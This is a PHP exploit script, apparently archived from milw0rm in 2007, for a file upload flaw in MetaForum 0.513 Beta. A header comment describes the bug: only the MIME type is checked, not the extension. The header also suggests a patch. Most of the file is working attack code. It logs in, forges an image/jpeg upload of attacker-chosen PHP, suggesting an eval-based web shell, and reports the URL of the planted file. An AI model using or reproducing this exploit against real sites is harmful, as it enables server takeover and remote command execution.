<?php
/*---------------------------------------------------------*\
MetaForum <= 0.513 Beta - Remote file upload Vulnerability

[|Description:|]
A security bug has been discovered in MetaForum 0.513 Beta.
This bug can be used by an attacker to upload a malicious php file on the server.
During the upload, the MIME type of the file is the only verified parameter. The extention isn't.
This enables a attacker to fake the MIME type of a php file so that it is considered as an image.

[|Advisory:|]
http://www.aeroxteam.fr/advisory-MetaForum-0.513b.txt

[|Solution:|] (unofficial)
Replace line 110 in the file usercp.php by:
if (($_FILES['imagefile']['type'] == "image/jpeg" || $_FILES['imagefile']['type'] == "image/pjpeg" || $_FILES['imagefile']['type'] == "image/png" || $_FILES['imagefile']['type'] == "image/gif") && in_array(strtolower(substr(strrchr($_FILES['imagefile']['name'], '.'),1)), array('gif', 'jpg', 'jpeg', 'png')))

C0d3d by Gu1ll4um3r0m41n (aeroxteam --[at]-- gmail --[dot]-- com)
for AeroX & NeoAlpha (AeroXteam.fr -- Neoalpha.fr)
(C)opyleft 2007
Gr33tz: Math., Syntax ERROR, Barma, NeoMorphS, Snake91, Spamm, Kad, Nitr0, Jethro And everybody from #aerox
\*---------------------------------------------------------*/
if(count($argv) == 6) {
	head();
	echo "PHP code to write (ex: <?php eval(stripslashes(\$_GET['cmd'])); ?>) :\r\n";
	$phpcode = trim(fgets(STDIN));
	echo "\r\n[+] Connection... ";
	$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die("Failed\r\n\r\nCould not connect to ".$argv[1]." on the port 80 !");
	}
	echo "OK\r\n";
	echo "[+] Login to account... ";
	$reqlogin = "POST ".$argv[2]."index.php?shard=login&action=proc_login HTTP/1.1\r\n";
	$reqlogin .= "Host: ".$argv[1]."\r\n";
	$reqlogin .= "Accept: */*\r\n";
	$reqlogin .= "Connection: Close\r\n";
	$reqlogin .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$reqlogin .= "Content-Length: ".strlen("login_name=".$argv[3]."&login_pass=".$argv[4])."\r\n\r\n";
	$reqlogin .= "login_name=".$argv[3]."&login_pass=".$argv[4];
	fwrite($sock, $reqlogin);
	while(!feof($sock)) {
		$buffer = fgets($sock);
		if(preg_match("`Set-Cookie: ".$argv[5]."userID=(.*?);`", $buffer, $idtmp)) { $id = $idtmp[1]; }
	}
	if(empty($id)) {
		die("Failed\r\n\r\nCould not login as ".$argv[3]." !");
	} else {
		echo "OK\r\n";
	}
	fclose($sock);

	echo "[+] Sending of the file... ";
	$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die("Failed\r\n\r\nCould not connect to ".$argv[1]." on the port 80 !");
	}
	$requp = "POST ".$argv[2]."index.php?shard=usercp&action=g_avatar HTTP/1.1\r\n";
	$requp .= "Host: ".$argv[1]."\r\n";
	$requp .= "Accept: */*\r\n";
	$requp .= "Connection: Close\r\n";
	$requp .= "Cookie: ".$argv[5]."username=".$argv[3]."; ".$argv[5]."userID=".$id."; ".$argv[5]."password=".sha1($argv[4])."\r\n";
	$requp .= "Content-Type: multipart/form-data; boundary=--------------268742553814512\r\n";
	$requp2 .= "----------------268742553814512\r\n";
	$requp2 .= "Content-Disposition: form-data; name=\"upload_flag\";\r\n\r\n";
	$requp2 .= "true\r\n";
	$requp2 .= "----------------268742553814512\r\n";
	$requp2 .= "Content-Disposition: form-data; name=\"imagefile\"; filename=\"owned.php\";\r\n";
	$requp2 .= "Content-Type: image/jpeg\r\n\r\n";
	$requp2 .= $phpcode."\r\n";
	$requp2 .= "----------------268742553814512\r\n";
	$requp2 .= "Content-Disposition: form-data; name=\"Submit\";\r\n\r\n";
	$requp2 .= "Submit\r\n";
	$requp2 .= "----------------268742553814512--\r\n";
	$requp .= "Content-Length: ".strlen($requp2)."\r\n\r\n";
	$requp .= $requp2;
	fwrite($sock, $requp);
	while(!feof($sock)) {
		if(preg_match("`<img src='images/".$argv[3].".php'`", fgets($sock))) { $ok = 1; }
	}
	if($ok == 1) {
		echo "OK\r\n\r\nYou can access the file at:\r\nhttp://".$argv[1].$argv[2]."images/".$argv[3].".php\r\n\r\nThank for using this exploit !";
	} else {
		die("Failed\r\n\r\nMaybe not vulnerable ?!");
	}
} else {
	usage();
}
function usage() {
	echo "+----------------------------------------------------------------+\r\n";
	echo "|            MetaForum <= 0.513_beta Remote file upload          |\r\n";
	echo "|             By Gu1ll4um3r0m41n for AeroX & NeoAlpha            |\r\n";
	echo "| Usage: php exploit.php site.com /path/ user pass cookie_prefix |\r\n";
	echo "+----------------------------------------------------------------+\r\n";
}
function head() {
	echo "+----------------------------------------------+\r\n";
	echo "|  MetaForum <= 0.513_beta Remote file upload  |\r\n";
	echo "|   By Gu1ll4um3r0m41n for AeroX & NeoAlpha    |\r\n";
	echo "+----------------------------------------------+\r\n\r\n";
}
?>

# milw0rm.com [2007-03-19]
